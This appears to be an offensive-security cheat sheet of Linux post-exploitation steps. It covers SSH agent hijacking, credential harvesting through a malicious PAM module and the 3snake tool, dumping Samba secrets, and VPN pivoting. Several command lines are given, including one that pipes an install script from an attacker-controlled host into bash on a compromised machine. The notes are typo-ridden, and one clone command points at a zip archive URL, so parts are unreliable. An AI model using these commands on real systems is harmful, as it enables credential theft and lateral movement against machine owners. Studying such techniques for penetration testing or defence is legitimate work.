# SSH Hijacking
- In order for this method to be seccessuful, the compromised machine should have an acive ssh sessesion established to another machive via `Public Key Authentication`.

- If we are root on the compromised system, it is theb possible to either compromise the ssh agent or access the ssh agent unix domain socket and hijack the connection.

# Stealing SSH Credentials
- You have compromised a remote machine and get root and youu would like to collect as many credentials as possible to move laterally.

- We can do steal ssh credentials thoud `a malicious PAM module`
- Every SSH connection attempt will be forwarded to a server under your control, accompanied by the credentials used for this connection attempts

On attacking machine:
Host and edit `install.sh` and `looter.py` pointing the url variable to a server under your control, that can log POST request.

```sh
sudo git clone https://github.com/mthbernarder/sshLooter.git
```

On the compromised machine:

```
curl http://attacker:8000/install.sh | bash
```

# Samba secret to domain admin
Assuming we're root on a machone

```
tdbdump /var/lib/samba/private/secrets.tdb
```

(From Linux to AD)[[https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae91]]

# VPNPivot

```sh
git clone https://github.com/0x36/VPNPivot.sh && cd VPNPivot
./autogen.sh
./configure
make && make install
```


[[Dumping Browsers Credentails]]

# Sudo ssh access
You have compromised a remote machine and get root
This well capture creds information on ssh login.

Run this script on target machine

```sh
git clone https://www.github.com/blendin/3snake/archive/master.zip
unzip master.zip
cd 3snake-master
make
./3snake
```